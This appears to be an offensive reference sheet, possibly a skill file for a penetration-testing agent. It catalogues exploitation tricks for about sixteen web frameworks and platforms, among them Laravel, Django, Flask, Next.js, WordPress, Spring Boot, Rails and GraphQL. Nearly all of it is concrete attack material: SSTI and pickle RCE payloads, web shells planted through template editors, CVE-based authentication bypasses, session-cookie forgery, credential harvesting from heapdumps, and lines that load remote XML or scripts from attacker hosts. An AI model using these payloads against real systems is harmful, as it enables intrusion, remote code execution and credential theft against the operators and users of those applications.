_comment: Framework-specific exploitation tricks (signals to fingerprint, known vulns/CVEs, and concrete attack tricks). Synthesized from general security knowledge.

signals: _debugbar / telescope / horizon endpoints + Blade error pages
vulns: APP_KEY leak → AES-256-CBC/GCM cookie forgery → PHP deserialization RCE (CVE-2018-15133; Invoice Ninja CVE-2024-55555, Snipe-IT CVE-2024-48987, Crater CVE-2024-55556)
HTTP argv/env override → auth bypass (CVE-2024-52301)
Wildcard file validation bypass on files.* (CVE-2025-27515)
Debug-mode Whoops reflected XSS (CVE-2024-13918/13919)
Unsafe SQL functions (DB::raw / orderByRaw style concat)
tricks: Offline APP_KEY brute-force of leaked XSRF-TOKEN/laravel_session ciphertexts (Synacktiv: ~3.99% crack rate, top-10 default keys in commercial templates)
phpggc Laravel/RCE13|RCE9|RCE15 + laravel_crypto_killer.py encrypt → deliver to any decrypt() sink (route/cookie/session)
?--env=preprod / ?--env=local query override when register_argc_argv=On
Multipart field files[0][__asterisk__payload]=@shell.php to skip validator but still write UploadedFile
LFI/debug page → /../.env to recover APP_KEY and DB creds

signals: debug stack traces / X-Frame-Options error pages for version fingerprinting
vulns: Cache pickle deserialization → RCE (FileBasedCache / Redis / DB backends; HackerOne #1415436)
Host header / password-reset poisoning via request.META['HTTP_HOST'] bypassing ALLOWED_HOSTS
SSTI in Django Template Language (DTL is Turing-complete)
PickleSerializer + signed_cookies session backend → SECRET_KEY leak = RCE
SQLi in QuerySet values/alias/JSONField key names (CVE-2024-42005, CVE-2025-57833); log injection (CVE-2025-48432)
tricks: {{7*7}} → 49 SSTI probe; {{''.__class__.mro()[1].__subclasses__()}} walk to subprocess.Popen
{{ users.values }} QuerySet dump bypasses __str__ filtering even when RCE is blocked
badsecrets against sessionid to test known/weak SECRET_KEY
Drop malicious pickle at /var/tmp/django_cache/<key> (os.system __reduce__)
signing.dumps(RCE(), key=SECRET_KEY, serializer=PickleSerializer) → sessionid=RCE cookie

signals: session cookie (URL-safe base64, signed not encrypted)
Werkzeug server headers / debugger PIN page
vulns: SSTI via Jinja2 when user input reaches render_template_string/format
Session cookie forgery → privilege escalation when secret key is leaked/weak
Unsafe proxy URL concatenation → SSRF via '@' host confusion in request path
tricks: flask-unsign --decode / --wordlist rockyou --unsign / --sign {'logged_in':True}
GET @/ or @attacker.example request-target to reach Flask routes and poison concatenated URLs
ripsession to automate cookie forgery across a wordlist
sqlmap --eval to sign SQLi payloads with a known Flask secret
Werkzeug debug console PIN is DERIVED (not stored): username+flask.app+Flask+mod_path+MAC(decimal)+machine_id -> compute PIN -> unlock /console -> RCE (read_skill bs-flask-debug-rce)

vulns: qs / extended urlencoded parser → prototype pollution, mass assignment, NoSQLi via nested keys
trust proxy misconfig → X-Forwarded-* header spoofing (host/proto/ip)
Session fixation (no req.session.regenerate() after login)
Method-override smuggling of PUT/PATCH/DELETE through POST-only edges
Signed-cookie secret brute-force / rotation-key weakness
tricks: ?user[role]=admin&filters[name][$ne]=x (qs nesting, __proto__/constructor[prototype] payloads)
X-Forwarded-Host/Proto/For spoofing for reset-poisoning, IP allowlist and rate-limit bypass
X-HTTP-Method-Override: DELETE or POST /x?_method=PUT to reach hidden routes/CSRF
cookie-monster -c <cookie> -w wordlist to brute cookie secrets then re-sign

vulns: Middleware auth bypass via x-middleware-subrequest header (CVE-2025-29927)
RSC Flight deserialization → prototype pollution → RCE (CVE-2025-55182 / React2Shell, react-server-dom-webpack 19.0.0–19.2.0)
RSC cache poisoning / content-type confusion → stored XSS (CVE-2025-49005, Re:CACHE)
RSC DoS + Server Function source disclosure (CVE-2025-55183/55184/67779)
Client-side path traversal (CSPT) and dangerouslySetInnerHTML XSS
tricks: x-middleware-subrequest: middleware:middleware:... to flip 307→200 on protected routes
Flight payload {"then":"$1:__proto__:then", _formData.get:"$1:constructor:constructor", _prefix: require('child_process').exec(...)}
react2shell-scanner --safe-check (500 + E{"digest"} = vulnerable oracle)
Hash↔function mapping: regex createServerReference(...) in chunks + source maps, swap Next-Action values
Accept/Rsc: 1 header to force RSC payload; _buildManifest.js for route enumeration

signals: v-html directive / Vue runtime in JS bundles
vulns: v-html raw HTML XSS (img onerror)
v-bind:href/src javascript: URL injection
SSR untrusted template → RCE (vue-template-compiler CVEs)
Prototype pollution in plugins (vue-i18n deep-merge GHSA-p2ph-7g93-hw3m)
Open redirect via unchecked route query next param
tricks: through v-html
javascript:alert(1) via v-bind:href user input
createSSRApp({ template: userProvidedHtml }) = server-side code exec
JSON.parse('{"__proto__":{"polluted":true}}') into deepmerge helper
window.location.assign(this.$route.query.next) open redirect

vulns: bypassSecurityTrustHtml/Url/Style misuse → sanitizer bypass XSS
Runtime template injection {{constructor.constructor('alert(1)')()}}
DOM XSS via ElementRef.nativeElement, Renderer2.setAttribute/setProperty, jQuery html()
Open redirect via window.location / document.location sinks
tricks: bypassSecurityTrustHtml('<svg onclick=alert(1)>') — script tags inert via innerHTML but on* attributes fire
{{constructor.constructor('alert(1)')()}} when attacker input is compiled as template (not plain interpolation)
renderer2.setAttribute(el,'onerror','alert(1)') on
document.write/createElement + appendChild script sinks
Source-map disclosure for source reconstruction when sourceMap enabled

vulns: Unauth plugin/theme SQLi/LFI/file-deletion via wp_ajax_nopriv_ handlers (WP Job Portal, Depicter, Kubio, Litho)
Trusted-header REST impersonation → admin creation (WooCommerce Payments ≤5.6.1, X-Wcpay-Platform-Checkout-User: 1)
Nonce-as-authorization misuse → arbitrary plugin install/activate RCE (FunnelKit, Motors)
XML-RPC credential brute-force + pingback SSRF/DDoS + 2FA bypass
Pre-auth login XSS → DOM clobbering → RCE chain (XSS2Shell, core <7.0.3); MU-plugin stealth persistence
tricks: ?author=1 user-ID enumeration + wp-json/wp/v2/users dump
system.multicall for multi-cred brute-force; wp.uploadFile for RCE once creds obtained
X-Wcpay-Platform-Checkout-User: 1 on POST /wp-json/wp/v2/users with roles:[administrator]
admin-ajax.php action=<nopriv> fontfamily=../../../wp-config.php (arbitrary delete/LFI/SQLi)
Theme Editor → edit 404.php with system($_GET['cmd']) → curl /wp-content/themes/<theme>/404.php?cmd=id

vulns: Unauth API info disclosure (CVE-2023-23752, Joomla 4.0.0–4.2.7)
Admin template-edit → PHP injection → RCE
XSS → RCE / privilege-escalation chains (JoomSploit)
tricks: /api/v1/users?public=true and /api/index.php/v1/config/application?public=true (CVE-2023-23752)
Templates → Customise → error.php → system($_GET['cmd']) → /templates/protostar/error.php?cmd=id
droopescan scan joomla --url <target>
joomla-brute.py default creds (admin:admin)

signals: Spring Boot version banners / error pages
vulns: Exposed actuator endpoints → sensitive data + env/config disclosure
/jolokia reloadByURL → logback XXE/RCE via external XML config
/env property modification → XStream deserialization RCE (Eureka serviceURL) + H2 RCE chain
/heapdump JVM snapshot secrets (DB creds, tokens, Basic-Auth)
/loggers level escalation to capture auth credentials
tricks: wget /actuator/heapdump && strings | grep 'Authorization: Basic' then base64 -d; JDumpSpider/VisualVM OQL for DataSourceProperties
POST /env eureka.client.serviceUrl.defaultZone=http://attacker/xstream
/jolokia/exec/.../reloadByURL/http:!/!/attacker/logback.xml
POST /actuator/loggers/org.springframework.security {configuredLevel:TRACE} then harvest /actuator/logfile
GET ;@evil.com/url matrix-parameter pathname confusion → SSRF

vulns: getContextPath() link manipulation → XSS via protocol-relative URL injection
EL / JSTL expression injection in templates
Related: Struts2 OGNL / Spring EL RCE families
tricks: //attacker.example/xss.js#/..;/..;/contextPathExample/test.jsp → //attacker.example/xss.js script src XSS
Prepend request.getContextPath() into src/href/action attributes without HTML-attribute encoding
URL-encode then HTML-attribute-encode dynamic values; fixed trusted base to avoid request-controlled origin

vulns: eval/exec expression injection
pickle deserialization → __reduce__ RCE
Python sandbox escapes (load_name/load_const OOB, js2py CVE-2024-28397)
ReportLab/xhtml2pdf triple-bracket [[[...]]] rl_safe_eval RCE (CVE-2023-33733)
Class pollution (Python's prototype pollution)
tricks: "+str(True)+" probe to confirm expression evaluation vs reflection
pickle class RCE: __reduce__ → os.system
[[[ expression ]]] injection into PDF generation flows (xhtml2pdf)
Subclass-walk object graph for sandbox escape gadgets

vulns: ServeMux CONNECT method skips path canonicalization → path traversal/authz bypass
text/template (not html/template) SSTI/XSS
SSRF via proxied request targets
Race-condition / TOCTOU logic bugs
tricks: curl --path-as-is -X CONNECT http://target/../flag to bypass cleanPath redirect on ordinary methods
Compare CONNECT vs GET/POST response to detect auth-boundary traversal
Inject {{.}} / template actions into text/template sinks

vulns: Arbitrary file upload to config/initializers/ → boot-time RCE (CVE-2024-46986 Camaleon)
Active Storage image transformation command injection (CVE-2025-24293, mini_magick)
Rack::Static LFI / path traversal (CVE-2025-27610)
ReDoS family: Rack Content-Type (CVE-2024-25126), REXML (CVE-2024-49761), CGI cookie (CVE-2025-27219/27220)
Nested mass assignment via permit! on sub-object; secret_key_base → cookie/signed_id forgery; log injection → RCE via load + Pathname.cleanpath
tricks: Upload .rb into config/initializers/ or eager-load paths to get boot-time code exec
Forged cookie: ActiveSupport::MessageEncryptor aes-256-gcm + KeyGenerator(secret_key_base) decrypt→modify role→re-sign
Forge signed_id/sgid (find_signed!, GlobalID::Locator.locate_signed) for IDOR→authz bypass
CVE-2025-24293: image_tag blob.variant(params[:t]=>params[:v]) fuzz transform names to reach MiniMagick exec
Log poison: %0A][0]=1;system("id")#://../../../../logs/error.log then load cleanpath-resolved log

signals: .pl/.pm endpoints + mod_perl handler registration in httpd.conf
vulns: Command injection via backticks/qx//, one-arg system STRING, two-arg open 'cmd |'
Pre-auth RCE via raw $r->uri() concatenated into shell command (Dell UnityVSA CVE-2025-36604)
IPC::Open3 single-string shell handling + explicit /bin/sh -c sinks
tricks: GET /ui/health;id with separators ; && | $() %0A; end-string payloads like ;id#
Unauthenticated login-redirect branch (type=='login') to reach getCASURL backtick sink
Grep for qx//, open\s*\(|, system\(" and trace sink→$r entry for pre-auth reachability
Patch-diff modules for inconsistent quoting between branches

vulns: Introspection schema disclosure + broken object-level authorization (BOLA) via query variables
DoS via alias/directive/field duplication, array batching, @defer/@stream amplification
CSRF via form-urlencoded/GET + cross-site WebSocket hijacking
Multipart Upload scalar abuse (CSRF, variable reuse, orphan file parts)
Engine CVEs: async-graphql directive overload (CVE-2024-47614), graphql-java ENF depth bypass (CVE-2024-40094), WPGraphQL SSRF→RCE (CVE-2023-23684), Apollo Gateway planner DoS (CVE-2025-32031)
tricks: Alias-based brute-force / rate-limit bypass: isValidDiscount1..N in one request; batching 1000s of credential pairs
Bypass introspection filters with newline after __schema, or switch GET/form-urlencoded/WebSocket
APQ is not a safelist: send unknown sha256Hash → on PersistedQueryNotFound resend with full query string
updateProfile(username:INJECT) chained/unauthorized mutations; forged schema via error-based clairvoyance/InQL bruteforcer
@include(if:true) x N and recursive fragments ...A/...B to exhaust planner/parser
